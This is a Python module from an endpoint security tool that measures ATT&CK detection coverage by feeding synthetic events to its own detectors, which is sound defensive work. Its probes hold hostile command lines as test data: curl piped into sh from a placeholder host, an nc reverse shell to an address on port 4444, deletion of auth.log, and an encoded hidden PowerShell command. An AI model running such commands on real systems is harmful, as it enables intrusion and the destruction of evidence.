"""ATT&CK coverage, measured rather than claimed.

Endpoint products are measured covering roughly half of ATT&CK, and even that
figure is inflated by rules nobody would act on (USENIX Security 2024). A map
that lists which collector "covers" a technique says nothing about whether the
detection still fires. So each technique here gets one of four levels:

  validated   a probe fed a realistic event to the real detector and it fired,
              and a collector that feeds that detector is currently reporting
  claimed     a collector is mapped to the technique, but nothing proves it
  regressed   a probe that should fire did not — a detector broke silently
  blind       nothing here looks for it

Probes call the same functions the collectors call, with synthetic evidence;
they never execute a technique on the machine, so they cannot trip alerts or
leave artefacts. They validate the rule. Sensor liveness is judged separately
from each feeding collector's freshness, so a proven rule behind a dead
collector is reported as such, not as coverage.
"""

import json
import os
import tempfile
import time

from jarvis.core.finding import finding as _finding

META = "attack_coverage_v1"
TACTIC_ORDER = (
    "reconnaissance", "resource-development", "initial-access", "execution",
    "persistence", "privilege-escalation", "credential-access",
    "discovery", "lateral-movement", "collection", "command-and-control",
    # ATT&CK split defense-evasion into these two; older catalogues keep it.
    "stealth", "defense-impairment", "defense-evasion",
    "exfiltration", "impact",
)


# ── probes ──────────────────────────────────────────────────────────────────
# Each returns (fired, what it checked). Imports are local so one broken
# detector module fails its own probe instead of the whole map.

def _linux_rules(*events):
    from jarvis.collectors.telemetry import sysmon_linux
    return sysmon_linux._rules(list(events))


def _titles(findings, severities=("critical", "high", "medium")):
    return [f["title"] for f in findings if f.get("severity") in severities]


def probe_injection():
    from jarvis.collectors.telemetry import sysmon
    v = sysmon.thread_verdict(r"C:\Users\x\AppData\Local\Temp\a.exe", r"C:\Windows\explorer.exe",
                              "-", "-", "0x000001A2B3C40000")
    return bool(v and v[0] == "critical"), "remote thread starting in unbacked memory"


def probe_download_run():
    out = _linux_rules({"id": 1, "Image": "/usr/bin/bash", "ParentImage": "/usr/bin/sshd",
                        "CommandLine": "bash -c 'curl -s https://x.example/i.sh | sh'"})
    return "download-and-run in a command line" in _titles(out), "curl piped into sh"


def probe_log_removal():
    out = _linux_rules({"id": 26, "Image": "/usr/bin/rm", "TargetFilename": "/var/log/auth.log"})
    return "a log or history file was deleted" in _titles(out), "rm of /var/log/auth.log"


def probe_webshell_spawn():
    out = _linux_rules({"id": 1, "Image": "/usr/bin/sh", "ParentImage": "/usr/sbin/nginx",
                        "CommandLine": "sh -c id"})
    return any("spawned a shell" in t for t in _titles(out)), "nginx spawning sh"


def probe_service_persistence():
    out = _linux_rules({"id": 11, "Image": "/usr/bin/cp",
                        "TargetFilename": "/etc/systemd/system/update-helper.service"})
    return "write to a persistence or trust location" in _titles(out), "new systemd unit by cp"


def probe_reverse_shell():
    out = _linux_rules({"id": 1, "Image": "/usr/bin/nc", "ParentImage": "/usr/bin/bash",
                        "CommandLine": "nc 203.0.113.9 4444 -e /bin/sh"})
    return any("connect-back" in t for t in _titles(out)), "nc -e to a public address"


def probe_encoded_command():
    from jarvis.collectors.process import detect
    reasons = detect.traits({"host": "win", "name": "powershell.exe",
                             "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                             "cmdline": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="})
    return "encoded-command" in reasons, "powershell -enc"


def probe_masquerade():
    from jarvis.collectors.process import detect
    reasons = detect.traits({"host": "win", "name": "svchost.exe",
                             "exe": r"C:\Users\x\AppData\Local\Temp\update.exe", "cmdline": ""})
    return "name-mismatch" in reasons and "temp-exec" in reasons, "svchost.exe name on a temp binary"


def probe_private_key():
    from jarvis.collectors.identity.secrets import patterns
    # Only the openssh-key-v1 header with "none" cipher fields, repeated: no
    # key material. The armor is assembled at runtime so this source file is
    # not itself a key-shaped literal for the secrets collector to report.
    armor = "OPENSSH PRIVATE KEY"
    body = (f"-----BEGIN {armor}-----\n" + "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ" * 4 +
            f"\n-----END {armor}-----\n")
    with tempfile.NamedTemporaryFile("w", suffix=".pem", delete=False) as fh:
        fh.write(body)
    try:
        hits = patterns.scan_file(fh.name)
    finally:
        os.unlink(fh.name)
    return bool(hits), "unencrypted private key block in a file"


def probe_c2_domain():
    from jarvis.core import warninglist
    from jarvis.core.store import Store
    with tempfile.TemporaryDirectory() as tmp:
        store = Store(os.path.join(tmp, "probe.db"))
        try:
            store.db.execute(
                """INSERT INTO indicators(kind,value,norm,confidence,topic,context,malware,
                                          source_url,first_seen,last_seen,source)
                   VALUES('domain','kx9-relay.top','kx9-relay.top','high','','c2','probe','',0,0,'threatfox')""")
            m = warninglist.match_domain(store, "api.kx9-relay.top")
        finally:
            store.close()
    return bool(m and m["severity"] == "critical"), "subdomain of a ThreatFox C2 domain"


def probe_hidden_process():
    from jarvis.collectors.process.hidden import run
    pid = os.getpid()
    return run.confirmed_ghosts([pid], set(), {pid}) == [pid], "live pid absent from /proc listing"


def probe_popular_domain_not_flagged():
    # The inverse probe: a false-positive regression is a detector failure too.
    from jarvis.core import warninglist
    from jarvis.core.store import Store
    with tempfile.TemporaryDirectory() as tmp:
        store = Store(os.path.join(tmp, "probe.db"))
        try:
            store.db.execute(
                """INSERT INTO indicators(kind,value,norm,confidence,topic,context,malware,
                                          source_url,first_seen,last_seen,source)
                   VALUES('domain','azure.com','azure.com','medium','','x','','',0,0,'exa')""")
            m = warninglist.match_domain(store, "onedscolprdneu53.northeurope.cloudapp.azure.com")
        finally:
            store.close()
    return m is None, "Windows telemetry host not matched by a writeup's azure.com"


# tid -> (probe, feeding collector jobs)
PROBES = {
    "T1055": (probe_injection, ("sysmon", "memscan")),
    "T1105": (probe_download_run, ("sysmon_linux",)),
    "T1070": (probe_log_removal, ("sysmon_linux",)),
    "T1505": (probe_webshell_spawn, ("sysmon_linux", "webshell")),
    "T1543": (probe_service_persistence, ("sysmon_linux", "control")),
    "T1059": (probe_encoded_command, ("scan",)),
    "T1036": (probe_masquerade, ("scan",)),
    "T1552": (probe_private_key, ("secrets",)),
    "T1071": (probe_c2_domain, ("sysmon", "hunt")),
    "T1014": (probe_hidden_process, ("hidden", "deep_hidden")),
    "T1219": (probe_reverse_shell, ("sysmon_linux",)),
}
# Precision probes guard against false-positive regressions; not a technique.
PRECISION = {"popular-domain filter": probe_popular_domain_not_flagged}


def _live(store, jobs):
    from jarvis.response.reporting import score
    from jarvis.service.schedule import JOBS
    snaps = store.get_snapshots()
    now = time.time()
    return [j for j in jobs if j in JOBS and not (snaps.get(j) or {}).get("error")
            and score.freshness(snaps.get(j), JOBS[j][0], now) == "current"]


def measure(store):
    """Build the coverage map. -> (findings, map)."""
    from jarvis.intel.gaps import COVERAGE

    catalogue = store.db.execute(
        "SELECT tid, name, tactics, platforms FROM attack_techniques").fetchall()
    techniques = [r for r in catalogue if "." not in r["tid"]
                  and any(p in (r["platforms"] or "") for p in ("Windows", "Linux"))]

    results, out = {}, []
    for tid, (probe, jobs) in PROBES.items():
        try:
            fired, what = probe()
        except Exception as exc:
            fired, what = False, f"probe raised {type(exc).__name__}: {exc}"
        results[tid] = (fired, what, _live(store, jobs), jobs)
        if not fired:
            out.append(_finding("coverage", "high", f"detection regressed: {tid}",
                                f"the probe ({what}) no longer fires in the real detector — "
                                f"this technique is not being caught", "attackmap"))
    for label, probe in PRECISION.items():
        try:
            ok, what = probe()
        except Exception as exc:
            ok, what = False, f"probe raised {type(exc).__name__}"
        if not ok:
            out.append(_finding("coverage", "high", f"false-positive guard regressed: {label}",
                                f"{what} — expected no match", "attackmap"))

    seen = {t for r in techniques for t in (r["tactics"] or "").split(",") if t}
    order = [t for t in TACTIC_ORDER if t in seen] + sorted(seen - set(TACTIC_ORDER))
    rows, tactics = [], {t: {"validated": 0, "claimed": 0, "blind": 0, "regressed": 0, "total": 0}
                         for t in order}
    for r in techniques:
        tid = r["tid"]
        if tid in results:
            fired, what, live, jobs = results[tid]
            if not fired:
                level, evidence = "regressed", what
            elif live:
                level, evidence = "validated", f"{what}; live via {', '.join(live)}"
            else:
                level, evidence = "claimed", f"{what} fires, but {', '.join(jobs)} not reporting"
        elif tid in COVERAGE:
            level, evidence = "claimed", COVERAGE[tid]
        else:
            level, evidence = "blind", ""
        tacs = [t for t in (r["tactics"] or "").split(",") if t in tactics]
        for t in tacs:
            tactics[t][level] += 1
            tactics[t]["total"] += 1
        rows.append({"tid": tid, "name": r["name"], "tactics": tacs, "level": level, "evidence": evidence})

    totals = {k: sum(1 for x in rows if x["level"] == k) for k in ("validated", "claimed", "regressed", "blind")}
    totals["total"] = len(rows)
    data = {"at": int(time.time()), "totals": totals, "tactics": tactics,
            "techniques": sorted(rows, key=lambda x: x["tid"])}
    store.set_meta(META, json.dumps(data))
    if totals["total"]:
        out.append(_finding(
            "coverage", "ok",
            f"ATT&CK: {totals['validated']} validated, {totals['claimed']} claimed, "
            f"{totals['blind']} blind of {totals['total']} techniques",
            "validated = the real detector fired on a probe and its collector is reporting; "
            "claimed = mapped without proof", "attackmap"))
    else:
        out.append(_finding("coverage", "low", "ATT&CK catalogue not loaded yet",
                            "the feeds job loads it monthly; the map follows", "attackmap"))
    return out, data


def latest(store):
    try:
        return json.loads(store.get_meta(META, "") or "null")
    except (TypeError, ValueError):
        return None
